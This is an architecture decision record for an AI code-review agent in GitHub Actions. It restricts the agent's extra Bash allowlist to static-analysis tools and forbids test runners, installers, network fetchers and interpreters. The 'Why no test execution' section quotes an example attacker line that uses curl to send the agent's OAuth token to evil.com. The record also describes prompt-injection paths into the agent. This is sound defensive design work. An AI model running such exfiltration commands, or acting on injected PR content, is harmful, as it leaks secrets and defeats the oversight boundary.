# ADR-004: extra_allowed_tools policy — static analysis only

Status: accepted; partially superseded by ADR-010 (re: §Decision Acceptable entries — eslint reclassified to Forbidden)
Date: 2026-05-08

## Context

The reviewer agent runs inside `anthropics/claude-code-action`, which gates
Bash invocations through an `--allowedTools` allowlist. The allowlist is the
primary capability boundary between the model and the runner: anything not on
it cannot be executed, and anything on it can be invoked by the model on
content drawn from an untrusted PR.

The current base allowlist (see `.github/workflows/review.yml`) is narrow:

```
Bash(gh pr view:*),Bash(gh pr diff:*),Bash(./central/.github/scripts/post-claude-review.sh:*)
```

That is sufficient for the existing five modes (`review`, `quick`, `deep`,
`gates`, `opus`). The wrapper-script discipline behind the third entry —
documented in `.github/scripts/post-claude-review.sh` — closes the
Comment-and-Control attack class (SECURITY.md TC-1, TC-2) by ensuring the
only path to `gh pr comment` accepts an integer-validated PR number plus a
stdin body, and rejects every other flag.

CodeRabbit and similar AI review tools have demonstrated that integrating
static-analysis output (linters, type checkers) raises finding specificity:
the model anchors comments on real diagnostics rather than pattern-matched
guesses. Consumer repos in the `loganrooks/*` set differ in language stack
(Python, TypeScript, mixed), so the central substrate cannot hard-code the
preferred toolset. A per-repo extension point is needed.

The hazard: any widening of the allowlist also widens the blast radius of a
prompt-injection or untrusted-input pivot. Test runners, package managers,
build tools, and network fetchers each open a clear path to secret
exfiltration or supply-chain compromise (SECURITY.md TC-4, TC-6). A policy
on what kinds of tools are acceptable extensions is therefore part of the
substrate's contract with consumers, not just a per-repo styling choice.

## Decision

Add an `extra_allowed_tools` input (string, default empty) to
`review.yml`. A new `Assemble allowlist` step joins the base allowlist with
the caller-supplied extension and emits the result to `$GITHUB_OUTPUT`; the
`anthropics/claude-code-action` step then references
`${{ steps.allowlist.outputs.tools }}` instead of inlining the literal in
`claude_args`. Composing in a separate step keeps the assembled allowlist
visible in CI logs for audit and avoids brittle string-concatenation in the
action invocation.

The policy on `extra_allowed_tools` content is **STATIC ANALYSIS ONLY**.

Acceptable entries (parse code, do not execute it):

| Category               | Tools                                                                                      |
| ---------------------- | ------------------------------------------------------------------------------------------ |
| Linters / type checkers | `ruff`, `mypy`, `pyright`, `eslint`, `tsc` (with `--noEmit`), `shellcheck`, `actionlint`, `yamllint`, `pylint`, `flake8` |
| Search / inspection    | `rg`, `ast-grep`, `jq`, `yq`                                                               |

> **Note (2026-05-14, partial supersession by ADR-010):** `eslint`
> is reclassified to Forbidden by
> [ADR-010](ADR-010-static-analysis-only-clarification.md) §Decision §1
> (loads `eslint.config.js` / `.eslintrc.js` from PR head as
> executable JavaScript — the threat class §"Why no test execution"
> excludes). ADR-010 §2 also documents wildcard-pattern limits.

Forbidden entries:

| Category         | Examples                                                                              |
| ---------------- | ------------------------------------------------------------------------------------- |
| Test runners     | `pytest`, `jest`, `vitest`, `mocha`, `npm test`, `cargo test`, `go test`              |
| Installers       | `pip install`, `npm install`, `yarn`, `cargo install`, `apt`, `brew`                  |
| Build tools      | `cargo build`, `npm build`, `tsc` with emit, `cmake`, `make`                          |
| Network fetchers | `curl`, `wget`, `http`, `gh api` for non-PR-context calls                             |
| Code execution   | `python`, `node`, `ruby`, `sh`, `bash` invoked directly                               |

Enforcement is by documentation and reviewer attention, not by a regex
validator on the input. The policy lives in this ADR, in `CONTRIBUTING.md`,
in `AGENTS.md`, and in the prominent `STATIC ANALYSIS ONLY` warning in the
input description rendered on the `review.yml` interface. `CONTRIBUTING.md`
flags any change to `extra_allowed_tools` — whether in the central
substrate or in a consumer caller stub — as ADR-required, so allowlist
widening always lands through human PR review.

### Why no test execution

This is the core threat (SECURITY.md TC-6). If the allowlist permits
`Bash(pytest:*)`, an attacker PR can include `tests/test_pwn.py` containing
arbitrary code (for example, `os.system("curl evil.com -d
${CLAUDE_CODE_OAUTH_TOKEN}")`) and the workflow will execute it inside the
runner with the OAuth token in environment. There is no escape from this:
a test runner whose contract is "execute code in this directory" cannot be
hardened against malicious code in that directory. Static analysis tools
have the opposite property — they parse without executing, so the worst
case on hostile input is a crash or noisy output, not exfiltration.

### Path B (sandboxed execution) — explicitly deferred

A future ADR may introduce a separate sandboxed-execution job: a workflow
triggered by `workflow_run` that runs PR-head tests in a no-secrets
context (`permissions: read-only`, no `CLAUDE_CODE_OAUTH_TOKEN`), then
surfaces results to the reviewer via artifacts. That is the right shape
for safely running PR-head code, but it doubles the workflow surface area
and the empirical value of test-results-as-reviewer-input is unproven for
the substrate's current scale. Out of scope for the first iteration.

## Alternatives considered

**Keep the base allowlist narrow forever (no `extra_allowed_tools`).**
Rejected. CodeRabbit and analogous tools demonstrate that static-analysis
input drives more specific findings; declining that affordance forecloses
real value. The hazard is widening capability uniformly across all
consumers, which this ADR avoids by making the extension per-repo and
opt-in.

**Allow test execution with sandboxing (Path B above).** Deferred. The
right architecture, but it requires a second workflow with a strict
no-secrets boundary and an artifact-passing protocol. Doing it correctly
is a meaningful piece of work and the value is unproven; doing it
incorrectly creates a new exfiltration path. We will revisit when a
specific consumer has a concrete need that static analysis cannot serve.

**Regex-validate `extra_allowed_tools` to enforce the policy mechanically.**
Rejected. A regex precise enough to catch policy drift (for example,
detecting `Bash(pytest:*)` or `Bash(curl:*)` in arbitrary positions of a
comma-separated list with quoting and globs) accumulates false positives
faster than it catches real violations: `ast-grep` patterns can match
shell-like syntax, project-specific lint wrappers may carry names that
look like test runners, and any interesting allowlist entry contains
parentheses and asterisks that are also regex metacharacters. We accept
that PR review of allowlist changes — required by `CONTRIBUTING.md` for
any `extra_allowed_tools` change — is the primary control surface, and
that the wrapper-script discipline (TC-1, TC-2) bounds the worst case if
review misses something.

## Consequences

**Positive.** Per-repo flexibility: a Python repo can extend with `ruff`
and `mypy`; a TypeScript repo with `eslint` and `tsc --noEmit`; a
shell-heavy repo with `shellcheck` and `actionlint`. The substrate keeps
one allowlist-composition path and one wrapper-script posting path, so
the added complexity is one input plus one assembly step, not five
mode-specific branches. The assembled allowlist is logged in CI on every
run, so the effective allowlist for any given review is auditable
post-hoc without inspecting workflow YAML by hand.

**Negative.** The policy is discipline-enforced, not gated. A reviewer
who does not internalize `STATIC ANALYSIS ONLY` could in principle merge
a PR adding `Bash(pytest:*)` to a consumer's caller stub. The threat
model (SECURITY.md TC-4) accepts this risk because the wrapper-script
discipline (TC-1, TC-2) limits the worst case in the orthogonal
prompt-injection direction to one bad comment, and because allowlist
changes are ADR-required and therefore reviewed under heightened
attention. Mitigation: the input description on `review.yml` carries the
`STATIC ANALYSIS ONLY` warning prominently; `CONTRIBUTING.md` lists
allowlist changes among the few categories that require an ADR;
`AGENTS.md` references this ADR as the operative policy for caller-stub
review.

**Neutral.** One additional `Assemble allowlist` step per workflow run.
The runtime cost is negligible (a few shell operations) but it is a real
step that appears in every CI log. The composition logic is a single
`echo "tools=...$EXTRA" >> "$GITHUB_OUTPUT"` with empty-extra handling;
its complexity does not warrant a dedicated script and lives inline in
`review.yml`.
